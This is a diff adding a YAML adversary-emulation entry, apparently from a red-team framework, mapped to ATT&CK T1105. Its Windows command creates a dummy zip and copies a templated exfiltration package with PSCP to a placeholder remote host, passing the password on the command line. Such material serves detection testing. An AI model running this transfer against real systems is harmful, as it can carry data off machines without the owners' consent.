@@ -1,0 +1,17 @@
+---
+- id: 8f52f3daa97398b06d6965b78362a239
+  name: Remote File Copy using PSCP
+  description: 'Copy a staged file using PSCP.exe to a public target location.
+
+    '
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  platforms:
+    windows:
+      cmd:
+        command: 'fsutil file createnew C:\Temp\T1105_scp.zip 1048576 && echo y |
+          #{pscp_binary} -P #{scp_port} -pw #{scp_password} #{exfil_package} #{scp_user}@#{target_location}:#{target_filename}'
+        payloads: []
+        cleanup: del /f /q C:\Temp\T1105_scp.zip
